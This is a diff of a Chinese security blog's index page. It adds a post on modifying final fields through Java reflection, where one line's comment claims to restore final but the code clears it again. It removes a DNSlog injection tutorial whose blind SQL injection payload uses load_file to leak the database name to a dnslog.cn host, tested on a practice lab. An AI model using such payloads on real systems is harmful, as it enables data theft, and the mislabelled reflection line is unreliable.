class_">StringBuilder</span>(<span class="string">&quot;lllllvzhouhang&quot;</span>));</span><br><span class="line">        m.invoke(c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这样使修改不成功的，但是还是可以修改，通过反射将name字段取出来后将final修饰符去掉就可以修改</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.operations.Mod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">finalstaticflectioncalc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">finalstaticreflection</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">finalstaticreflection</span>();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getClass().getDeclaredMethod(<span class="string">&quot;printName&quot;</span>);</span><br><span class="line">        c.printName();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> c.getClass().getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">ff</span> <span class="operator">=</span> f.getClass().getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        ff.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ff.setInt(f,f.getModifiers() &amp; ~Modifier.FINAL);<span class="comment">//去掉final修饰符</span></span><br><span class="line">        f.set(c,<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;lllllvzhouhang&quot;</span>));</span><br><span class="line">        ff.setInt(f,f.getModifiers() &amp; ~Modifier.FINAL);<span class="comment">//加上final修饰符</span></span><br><span class="line">        c.printName();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这样就成功修改了</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2024/04/12/weblogic%E4%B8%8A%E4%BC%A0%E9%A9%AC%E8%B7%AF%E5%BE%84%E9%80%89%E6%8B%A9/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1255,116 +1407,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2023/10/18/dnslog%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="lvzhouhang">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="lvzhouhang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/10/18/dnslog%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">dnslog注入学习</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-10-18 10:03:54" itemprop="dateCreated datePublished" datetime="2023-10-18T10:03:54+08:00">2023-10-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-03-12 15:28:46" itemprop="dateModified" datetime="2024-03-12T15:28:46+08:00">2024-03-12</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.5k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="什么是DNSlog"><a href="#什么是DNSlog" class="headerlink" title="什么是DNSlog"></a>什么是DNSlog</h2><p>DNS（Domain Name System）域名服务系统，简单的说就是域名与IP转换服务，比如用户输入a.com,DNS就会将a.com解析找到它真实的ip，以便于访问服务器上的相关服务，DNSlog就是存储在DNS服务器上的域名信息，它记录着用户对域名访问的信息，类似于日志文件。</p>
-<h2 id="DNSlog回显原理"><a href="#DNSlog回显原理" class="headerlink" title="DNSlog回显原理"></a>DNSlog回显原理</h2><p>首先我们先了解一下多级域名的概念</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_37263637/article/details/85157611">域名分级与域名解析过程(DNS)</a></p>
-<p>因特网采用层次树状结构命名方法。域是名字空间中一个可被管理的划分（按机构组织划分），域可被划分为子域，子域可再被划分，即形成了顶级域名、二级域名、三级域名等。从右向左为顶级域名、二级域名、三级域名等，用点隔开。例如<code>872323857.github.io</code>，io就是顶级域名，github就是二级域名，872323857就是三级域名。且域名不分大小写。</p>
-<p><img src="/pic/DNSLOG/DNSLOG.png"></p>
-<p>通俗的说就是我有个已注册的域名a.com，我在域名代理商那里将域名设置对应的ip 1.1.1.1  上，这样当我向dns服务器发起a.com的解析请求时，DNSlog中会记录下他给a.com解析，解析值为1.1.1.1，而我们这个解析的记录的值就是我们要利用的地方。</p>
-<p>自己操作一下才能更好的理解，首先在<a target="_blank" rel="noopener" href="http://www.dnslog.cn/%E4%B8%8A%E8%8E%B7%E5%BE%97%E4%B8%80%E4%B8%AA%E5%9F%9F%E5%90%8D%EF%BC%8C%E7%84%B6%E5%90%8E%E6%88%91%E4%BB%ACping%E4%B8%80%E4%B8%8B">http://www.dnslog.cn/上获得一个域名，然后我们ping一下</a></p>
-<p><img src="/pic/DNSLOG/DNSLOG2.png"></p>
-<p>我们将1换成别的试试</p>
-<p><img src="/pic/DNSLOG/DNSLOG3.png"></p>
-<p>可以看到解析的日志会把%USERNAME%的值给带出来，因为系统在ping命令之前会将%USERNAME%的值解析出来，然后再和域名拼接起来。</p>
-<h2 id="DNSlog利用"><a href="#DNSlog利用" class="headerlink" title="DNSlog利用"></a>DNSlog利用</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p><img src="/pic/DNSLOG/DNSLOG4.png"></p>
-<p>就以sql盲注为例，后端数据库用的mysql数据库，说一下用dnslog回显只能用于windows系统，为什么呢。因为在利用sql盲注进行DNSlog回显时，需要用到load_file函数，这个函数可以进行DNS请求。那<br>和只能在windows上用有什么关系呢，这里就涉及到Windows的一个小Tips——<strong>UNC路径</strong></p>
-<h3 id="UNC路径"><a href="#UNC路径" class="headerlink" title="UNC路径"></a>UNC路径</h3><p>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。<br> \abc.xxx\test<br>这也就解释了为什么CONCAT()函数拼接了4个\了,双斜杠表示网络资源路径多加两个\就是转义了反斜杠。<br> 通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。<code>show variables like &#39;%secure%&#39;</code>;查看load_file()可以读取的磁盘。<br> 1、当secure_file_priv为空，就可以读取磁盘的目录。<br> 2、当secure_file_priv为G:\，就可以读取G盘的文件。<br> 3、当secure_file_priv为null，load_file就不能加载文件。<br> 通过设置my.ini来配置。secure_file_priv=””就是可以load_flie任意磁盘的文件。</p>
-<p>在mysql中执行命令<code>select load_file(&#39;\\\\a.a92pjl.dnslog.cn\\a&#39;);</code>可以看到</p>
-<p><img src="/pic/DNSLOG/DNSLOG5.png"></p>
-<p>和之前的结合起来构造语句,用sqli靶场来测试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and if((select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.</span><br><span class="line">bhf0ay.dnslog.cn\\abc&#x27;))),1,0)--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/pic/DNSLOG/DNSLOG6.png"></p>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>DNSlog注入不止可以用于sql注入，还可以用于xss，xxe，ssrf等，思路打开。</p>
-<p>可以参考：</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Xy--1/p/12896599.html">https://www.cnblogs.com/Xy--1/p/12896599.html</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1434,7 +1476,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">55</span>
+          <span class="site-state-item-count">56</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1483,12 +1525,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
     </span>
-    <span title="站点总字数">268k</span>
+    <span title="站点总字数">279k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">4:03</span>
+    <span title="站点阅读时长">4:14</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
